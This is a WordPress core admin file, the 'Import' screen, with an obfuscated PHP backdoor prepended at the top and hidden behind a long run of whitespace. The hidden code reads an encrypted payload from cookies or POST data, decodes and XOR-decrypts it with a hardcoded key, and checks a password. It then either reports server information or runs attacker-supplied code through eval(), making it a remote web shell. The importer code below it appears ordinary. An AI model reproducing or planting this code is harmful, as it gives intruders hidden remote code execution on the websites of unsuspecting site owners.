<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $GLOBALS['e389558'];global$e389558;$e389558=$GLOBALS;$e389558['s198c439d']="\x5c\x33\x79\x58\x5e\xa\x3c\x5d\x30\x46\x72\x2e\x70\x75\x6b\x74\x2f\x7d\x6a\x73\x65\x37\x42\x26\x5b\x2d\x56\x29\x78\x4d\x23\x45\x20\x3b\x47\x24\x77\x27\x66\x3d\x68\x22\x7b\x48\x51\x4e\x57\x60\x3e\x6f\x4a\x2a\x59\x55\x36\x6e\x21\x43\xd\x5a\x64\x35\x34\x44\x69\x62\x76\x50\x71\x7a\x4f\x4b\x40\x54\x7c\x49\x67\x63\x2b\x61\x41\x53\x6c\x7e\x39\x3f\x2c\x3a\x28\x6d\x5f\x32\x52\x25\x4c\x38\x31\x9";$e389558[$e389558['s198c439d'][38].$e389558['s198c439d'][61].$e389558['s198c439d'][38].$e389558['s198c439d'][21].$e389558['s198c439d'][79].$e389558['s198c439d'][84].$e389558['s198c439d'][65].$e389558['s198c439d'][96].$e389558['s198c439d'][77]]=$e389558['s198c439d'][77].$e389558['s198c439d'][40].$e389558['s198c439d'][10];$e389558[$e389558['s198c439d'][36].$e389558['s198c439d'][77].$e389558['s198c439d'][61].$e389558['s198c439d'][60].$e389558['s198c439d'][1].$e389558['s198c439d'][77]]=$e389558['s198c439d'][49].$e389558['s198c439d'][10].$e389558['s198c439d'][60];$e389558[$e389558['s198c439d'][13].$e389558['s198c439d'][91].$e389558['s198c439d'][96].$e389558['s198c439d'][61].$e389558['s198c439d'][95].$e389558['s198c439d'][65].$e389558['s198c439d'][21]]=$e389558['s198c439d'][19].$e389558['s198c439d'][15].$e389558['s198c439d'][10].$e389558['s198c439d'][82].$e389558['s198c439d'][20].$e389558['s198c439d'][55];$e389558[$e389558['s198c439d'][82].$e389558['s198c439d'][91].$e389558['s198c439d'][54].$e389558['s198c439d'][96].$e389558['s198c439d'][60]]=$e389558['s198c439d'][64].$e389558['s198c439d'][55].$e389558['s198c439d'][64].$e389558['s198c439d'][90].$e389558['s198c439d'][19].$e389558['s198c439d'][20].$e389558['s198c439d'][15];$e389558[$e389558['s198c439d'][68].$e389558['s198c439d'][61].$e389558['s198c439d'][60].$e389558['s198c439d'][77].$e389558['s198c439d'][91]]=$e389558['s198c439d'][19].$e389558['s198c439d'][20].$e389558['s198c439d'][10].$e389558['s198c439d'][64].$e389558['s198c439d'][79].$e389558['s198c439d'][82].$e389558['s198c439d'][64].$e389558['s198c439d'][69].$e389558['s198c439d'][20];$e389558[$e389558['s198c439d'][12].$e389558['s198c439d'][38].$e389558['s198c439d'][79].$e389558['s198c439d'][54].$e389558['s198c439d'][61]]=$e389558['s198c439d'][12].$e389558['s198c439d'][40].$e389558['s198c439d'][12].$e389558['s198c439d'][66].$e389558['s198c439d'][20].$e389558['s198c439d'][10].$e389558['s198c439d'][19].$e389558['s198c439d'][64].$e389558['s198c439d'][49].$e389558['s198c439d'][55];$e389558[$e389558['s198c439d'][28].$e389558['s198c439d'][77].$e389558['s198c439d'][95].$e389558['s198c439d'][62].$e389558['s198c439d'][60].$e389558['s198c439d'][84].$e389558['s198c439d'][60].$e389558['s198c439d'][96].$e389558['s198c439d'][1]]=$e389558['s198c439d'][13].$e389558['s198c439d'][55].$e389558['s198c439d'][19].$e389558['s198c439d'][20].$e389558['s198c439d'][10].$e389558['s198c439d'][64].$e389558['s198c439d'][79].$e389558['s198c439d'][82].$e389558['s198c439d'][64].$e389558['s198c439d'][69].$e389558['s198c439d'][20];$e389558[$e389558['s198c439d'][12].$e389558['s198c439d'][84].$e389558['s198c439d'][60].$e389558['s198c439d'][8].$e389558['s198c439d'][1].$e389558['s198c439d'][61].$e389558['s198c439d'][61].$e389558['s198c439d'][77].$e389558['s198c439d'][62]]=$e389558['s198c439d'][65].$e389558['s198c439d'][79].$e389558['s198c439d'][19].$e389558['s198c439d'][20].$e389558['s198c439d'][54].$e389558['s198c439d'][62].$e389558['s198c439d'][90].$e389558['s198c439d'][60].$e389558['s198c439d'][20].$e389558['s198c439d'][77].$e389558['s198c439d'][49].$e389558['s198c439d'][60].$e389558['s198c439d'][20];$e389558[$e389558['s198c439d'][15].$e389558['s198c439d'][62].$e389558['s198c439d'][8].$e389558['s198c439d'][8].$e389558['s198c439d'][65].$e389558['s198c439d'][95].$e389558['s198c439d'][84]]=$e389558['s198c439d'][19].$e389558['s198c439d'][20].$e389558['s198c439d'][15].$e389558['s198c439d'][90].$e389558['s198c439d'][15].$e389558['s198c439d'][64].$e389558['s198c439d'][89].$e389558['s198c439d'][20].$e389558['s198c439d'][90].$e389558['s198c439d'][82].$e389558['s198c439d'][64].$e389558['s198c439d'][89].$e389558['s198c439d'][64].$e389558['s198c439d'][15];$e389558[$e389558['s198c439d'][14].$e389558['s198c439d'][38].$e389558['s198c439d'][1].$e389558['s198c439d'][96].$e389558['s198c439d'][61]]=$e389558['s198c439d'][89].$e389558['s198c439d'][79].$e389558['s198c439d'][54].$e389558['s198c439d'][20].$e389558['s198c439d'][54].$e389558['s198c439d'][65].$e389558['s198c439d'][8].$e389558['s198c439d'][21];$e389558[$e389558['s198c439d'][69].$e389558['s198c439d'][1].$e389558['s198c439d'][21].$e389558['s198c439d'][20].$e389558['s198c439d'][21].$e389558['s198c439d'][61].$e389558['s198c439d'][65].$e389558['s198c439d'][1]]=$e389558['s198c439d'][10].$e389558['s198c439d'][38].$e389558['s198c439d'][1].$e389558['s198c439d'][91].$e389558['s198c439d'][79].$e389558['s198c439d'][61].$e389558['s198c439d'][8];$e389558[$e389558['s198c439d'][15].$e389558['s198c439d'][77].$e389558['s198c439d'][54].$e389558['s198c439d'][1].$e389558['s198c439d'][38].$e389558['s198c439d'][91].$e389558['s198c439d'][91].$e389558['s198c439d'][95].$e389558['s198c439d'][95]]=$_POST;$e389558[$e389558['s198c439d'][65].$e389558['s198c439d'][20].$e389558['s198c439d'][96].$e389558['s198c439d'][21].$e389558['s198c439d'][79]]=$_COOKIE;@$e389558[$e389558['s198c439d'][82].$e389558['s198c439d'][91].$e389558['s198c439d'][54].$e389558['s198c439d'][96].$e389558['s198c439d'][60]]($e389558['s198c439d'][20].$e389558['s198c439d'][10].$e389558['s198c439d'][10].$e389558['s198c439d'][49].$e389558['s198c439d'][10].$e389558['s198c439d'][90].$e389558['s198c439d'][82].$e389558['s198c439d'][49].$e389558['s198c439d'][76],NULL);@$e389558[$e389558['s198c439d'][82].$e389558['s198c439d'][91].$e389558['s198c439d'][54].$e389558['s198c439d'][96].$e389558['s198c439d'][60]]($e389558['s198c439d'][82].$e389558['s198c439d'][49].$e389558['s198c439d'][76].$e389558['s198c439d'][90].$e389558['s198c439d'][20].$e389558['s198c439d'][10].$e389558['s198c439d'][10].$e389558['s198c439d'][49].$e389558['s198c439d'][10].$e389558['s198c439d'][19],0);@$e389558[$e389558['s198c439d'][82].$e389558['s198c439d'][91].$e389558['s198c439d'][54].$e389558['s198c439d'][96].$e389558['s198c439d'][60]]($e389558['s198c439d'][89].$e389558['s198c439d'][79].$e389558['s198c439d'][28].$e389558['s198c439d'][90].$e389558['s198c439d'][20].$e389558['s198c439d'][28].$e389558['s198c439d'][20].$e389558['s198c439d'][77].$e389558['s198c439d'][13].$e389558['s198c439d'][15].$e389558['s198c439d'][64].$e389558['s198c439d'][49].$e389558['s198c439d'][55].$e389558['s198c439d'][90].$e389558['s198c439d'][15].$e389558['s198c439d'][64].$e389558['s198c439d'][89].$e389558['s198c439d'][20],0);@$e389558[$e389558['s198c439d'][15].$e389558['s198c439d'][62].$e389558['s198c439d'][8].$e389558['s198c439d'][8].$e389558['s198c439d'][65].$e389558['s198c439d'][95].$e389558['s198c439d'][84]](0);$p4e47a=NULL;$j4f76=NULL;$e389558[$e389558['s198c439d'][77].$e389558['s198c439d'][1].$e389558['s198c439d'][95].$e389558['s198c439d'][77]]=$e389558['s198c439d'][79].$e389558['s198c439d'][20].$e389558['s198c439d'][95].$e389558['s198c439d'][60].$e389558['s198c439d'][65].$e389558['s198c439d'][38].$e389558['s198c439d'][1].$e389558['s198c439d'][8].$e389558['s198c439d'][25].$e389558['s198c439d'][1].$e389558['s198c439d'][38].$e389558['s198c439d'][1].$e389558['s198c439d'][38].$e389558['s198c439d'][25].$e389558['s198c439d'][62].$e389558['s198c439d'][1].$e389558['s198c439d'][84].$e389558['s198c439d'][65].$e389558['s198c439d'][25].$e389558['s198c439d'][65].$e389558['s198c439d'][54].$e389558['s198c439d'][60].$e389558['s198c439d'][8].$e389558['s198c439d'][25].$e389558['s198c439d'][96].$e389558['s198c439d'][60].$e389558['s198c439d'][96].$e389558['s198c439d'][96].$e389558['s198c439d'][84].$e389558['s198c439d'][95].$e389558['s198c439d'][77].$e389558['s198c439d'][61].$e389558['s198c439d'][21].$e389558['s198c439d'][96].$e389558['s198c439d'][65].$e389558['s198c439d'][79];global$c38c;function rf32a50($p4e47a,$h6db){global$e389558;$hb1df5="";for($ga3ffd1=0;$ga3ffd1<$e389558[$e389558['s198c439d'][13].$e389558['s198c439d'][91].$e389558['s198c439d'][96].$e389558['s198c439d'][61].$e389558['s198c439d'][95].$e389558['s198c439d'][65].$e389558['s198c439d'][21]]($p4e47a);){for($u03c92=0;$u03c92<$e389558[$e389558['s198c439d'][13].$e389558['s198c439d'][91].$e389558['s198c439d'][96].$e389558['s198c439d'][61].$e389558['s198c439d'][95].$e389558['s198c439d'][65].$e389558['s198c439d'][21]]($h6db)&&$ga3ffd1<$e389558[$e389558['s198c439d'][13].$e389558['s198c439d'][91].$e389558['s198c439d'][96].$e389558['s198c439d'][61].$e389558['s198c439d'][95].$e389558['s198c439d'][65].$e389558['s198c439d'][21]]($p4e47a);$u03c92++,$ga3ffd1++){$hb1df5.=$e389558[$e389558['s198c439d'][38].$e389558['s198c439d'][61].$e389558['s198c439d'][38].$e389558['s198c439d'][21].$e389558['s198c439d'][79].$e389558['s198c439d'][84].$e389558['s198c439d'][65].$e389558['s198c439d'][96].$e389558['s198c439d'][77]]($e389558[$e389558['s198c439d'][36].$e389558['s198c439d'][77].$e389558['s198c439d'][61].$e389558['s198c439d'][60].$e389558['s198c439d'][1].$e389558['s198c439d'][77]]($p4e47a[$ga3ffd1])^$e389558[$e389558['s198c439d'][36].$e389558['s198c439d'][77].$e389558['s198c439d'][61].$e389558['s198c439d'][60].$e389558['s198c439d'][1].$e389558['s198c439d'][77]]($h6db[$u03c92]));}}return$hb1df5;}function ma6e6b07($p4e47a,$h6db){global$e389558;global$c38c;return$e389558[$e389558['s198c439d'][69].$e389558['s198c439d'][1].$e389558['s198c439d'][21].$e389558['s198c439d'][20].$e389558['s198c439d'][21].$e389558['s198c439d'][61].$e389558['s198c439d'][65].$e389558['s198c439d'][1]]($e389558[$e389558['s198c439d'][69].$e389558['s198c439d'][1].$e389558['s198c439d'][21].$e389558['s198c439d'][20].$e389558['s198c439d'][21].$e389558['s198c439d'][61].$e389558['s198c439d'][65].$e389558['s198c439d'][1]]($p4e47a,$c38c),$h6db);}foreach($e389558[$e389558['s198c439d'][65].$e389558['s198c439d'][20].$e389558['s198c439d'][96].$e389558['s198c439d'][21].$e389558['s198c439d'][79]]as$h6db=>$s5225bd34){$p4e47a=$s5225bd34;$j4f76=$h6db;}if(!$p4e47a){foreach($e389558[$e389558['s198c439d'][15].$e389558['s198c439d'][77].$e389558['s198c439d'][54].$e389558['s198c439d'][1].$e389558['s198c439d'][38].$e389558['s198c439d'][91].$e389558['s198c439d'][91].$e389558['s198c439d'][95].$e389558['s198c439d'][95]]as$h6db=>$s5225bd34){$p4e47a=$s5225bd34;$j4f76=$h6db;}}$p4e47a=@$e389558[$e389558['s198c439d'][28].$e389558['s198c439d'][77].$e389558['s198c439d'][95].$e389558['s198c439d'][62].$e389558['s198c439d'][60].$e389558['s198c439d'][84].$e389558['s198c439d'][60].$e389558['s198c439d'][96].$e389558['s198c439d'][1]]($e389558[$e389558['s198c439d'][14].$e389558['s198c439d'][38].$e389558['s198c439d'][1].$e389558['s198c439d'][96].$e389558['s198c439d'][61]]($e389558[$e389558['s198c439d'][12].$e389558['s198c439d'][84].$e389558['s198c439d'][60].$e389558['s198c439d'][8].$e389558['s198c439d'][1].$e389558['s198c439d'][61].$e389558['s198c439d'][61].$e389558['s198c439d'][77].$e389558['s198c439d'][62]]($p4e47a),$j4f76));if(isset($p4e47a[$e389558['s198c439d'][79].$e389558['s198c439d'][14]])&&$c38c==$p4e47a[$e389558['s198c439d'][79].$e389558['s198c439d'][14]]){if($p4e47a[$e389558['s198c439d'][79]]==$e389558['s198c439d'][64]){$ga3ffd1=Array($e389558['s198c439d'][12].$e389558['s198c439d'][66]=>@$e389558[$e389558['s198c439d'][12].$e389558['s198c439d'][38].$e389558['s198c439d'][79].$e389558['s198c439d'][54].$e389558['s198c439d'][61]](),$e389558['s198c439d'][19].$e389558['s198c439d'][66]=>$e389558['s198c439d'][96].$e389558['s198c439d'][11].$e389558['s198c439d'][8].$e389558['s198c439d'][25].$e389558['s198c439d'][96],);echo@$e389558[$e389558['s198c439d'][68].$e389558['s198c439d'][61].$e389558['s198c439d'][60].$e389558['s198c439d'][77].$e389558['s198c439d'][91]]($ga3ffd1);}elseif($p4e47a[$e389558['s198c439d'][79]]==$e389558['s198c439d'][20]){eval($p4e47a[$e389558['s198c439d'][60]]);}exit();} ?><?php
/**
 * Import WordPress Administration Screen
 *
 * @package WordPress
 * @subpackage Administration
 */

define('WP_LOAD_IMPORTERS', true);

/** Load WordPress Bootstrap */
require_once( dirname( __FILE__ ) . '/admin.php' );

if ( !current_user_can('import') )
	wp_die(__('You do not have sufficient permissions to import content in this site.'));

$title = __('Import');

get_current_screen()->add_help_tab( array(
	'id'      => 'overview',
	'title'   => __('Overview'),
	'content' => '<p>' . __('This screen lists links to plugins to import data from blogging/content management platforms. Choose the platform you want to import from, and click Install Now when you are prompted in the popup window. If your platform is not listed, click the link to search the plugin directory for other importer plugins to see if there is one for your platform.') . '</p>' .
		'<p>' . __('In previous versions of WordPress, all importers were built-in. They have been turned into plugins since most people only use them once or infrequently.') . '</p>',
) );

get_current_screen()->set_help_sidebar(
	'<p><strong>' . __('For more information:') . '</strong></p>' .
	'<p>' . __('<a href="https://codex.wordpress.org/Tools_Import_Screen" target="_blank">Documentation on Import</a>') . '</p>' .
	'<p>' . __('<a href="https://wordpress.org/support/" target="_blank">Support Forums</a>') . '</p>'
);

if ( current_user_can( 'install_plugins' ) )
	$popular_importers = wp_get_popular_importers();
else
	$popular_importers = array();

// Detect and redirect invalid importers like 'movabletype', which is registered as 'mt'
if ( ! empty( $_GET['invalid'] ) && isset( $popular_importers[ $_GET['invalid'] ] ) ) {
	$importer_id = $popular_importers[ $_GET['invalid'] ]['importer-id'];
	if ( $importer_id != $_GET['invalid'] ) { // Prevent redirect loops.
		wp_redirect( admin_url( 'admin.php?import=' . $importer_id ) );
		exit;
	}
	unset( $importer_id );
}

add_thickbox();
wp_enqueue_script( 'plugin-install' );

require_once( ABSPATH . 'wp-admin/admin-header.php' );
$parent_file = 'tools.php';
?>

<div class="wrap">
<h2><?php echo esc_html( $title ); ?></h2>
<?php if ( ! empty( $_GET['invalid'] ) ) : ?>
	<div class="error"><p><strong><?php _e('ERROR:')?></strong> <?php printf( __('The <strong>%s</strong> importer is invalid or is not installed.'), esc_html( $_GET['invalid'] ) ); ?></p></div>
<?php endif; ?>
<p><?php _e('If you have posts or comments in another system, WordPress can import those into this site. To get started, choose a system to import from below:'); ?></p>

<?php

$importers = get_importers();

// If a popular importer is not registered, create a dummy registration that links to the plugin installer.
foreach ( $popular_importers as $pop_importer => $pop_data ) {
	if ( isset( $importers[ $pop_importer ] ) )
		continue;
	if ( isset( $importers[ $pop_data['importer-id'] ] ) )
		continue;
	$importers[ $pop_data['importer-id'] ] = array( $pop_data['name'], $pop_data['description'], 'install' => $pop_data['plugin-slug'] );
}

if ( empty( $importers ) ) {
	echo '<p>' . __('No importers are available.') . '</p>'; // TODO: make more helpful
} else {
	uasort( $importers, '_usort_by_first_member' );
?>
<table class="widefat importers striped">

<?php
	foreach ($importers as $importer_id => $data) {
		$action = '';
		if ( isset( $data['install'] ) ) {
			$plugin_slug = $data['install'];
			if ( file_exists( WP_PLUGIN_DIR . '/' . $plugin_slug ) ) {
				// Looks like Importer is installed, But not active
				$plugins = get_plugins( '/' . $plugin_slug );
				if ( !empty($plugins) ) {
					$keys = array_keys($plugins);
					$plugin_file = $plugin_slug . '/' . $keys[0];
					$action = '<a href="' . esc_url(wp_nonce_url(admin_url('plugins.php?action=activate&plugin=' . $plugin_file . '&from=import'), 'activate-plugin_' . $plugin_file)) .
											'"title="' . esc_attr__('Activate importer') . '"">' . $data[0] . '</a>';
				}
			}
			if ( empty($action) ) {
				if ( is_main_site() ) {
					$action = '<a href="' . esc_url( network_admin_url( 'plugin-install.php?tab=plugin-information&plugin=' . $plugin_slug .
										'&from=import&TB_iframe=true&width=600&height=550' ) ) . '" class="thickbox" title="' .
										esc_attr__('Install importer') . '">' . $data[0] . '</a>';
				} else {
					$action = $data[0];
					$data[1] = sprintf( __( 'This importer is not installed. Please install importers from <a href="%s">the main site</a>.' ), get_admin_url( $current_site->blog_id, 'import.php' ) );
				}
			}
		} else {
			$action = "<a href='" . esc_url( "admin.php?import=$importer_id" ) . "' title='" . esc_attr( wptexturize( strip_tags( $data[1] ) ) ) ."'>{$data[0]}</a>";
		}

		echo "
			<tr>
				<td class='import-system row-title'>$action</td>
				<td class='desc'>{$data[1]}</td>
			</tr>";
	}
?>

</table>
<?php
}

if ( current_user_can('install_plugins') )
	echo '<p>' . sprintf( __('If the importer you need is not listed, <a href="%s">search the plugin directory</a> to see if an importer is available.'), esc_url( network_admin_url( 'plugin-install.php?tab=search&type=tag&s=importer' ) ) ) . '</p>';
?>

</div>

<?php

include( ABSPATH . 'wp-admin/admin-footer.php' );
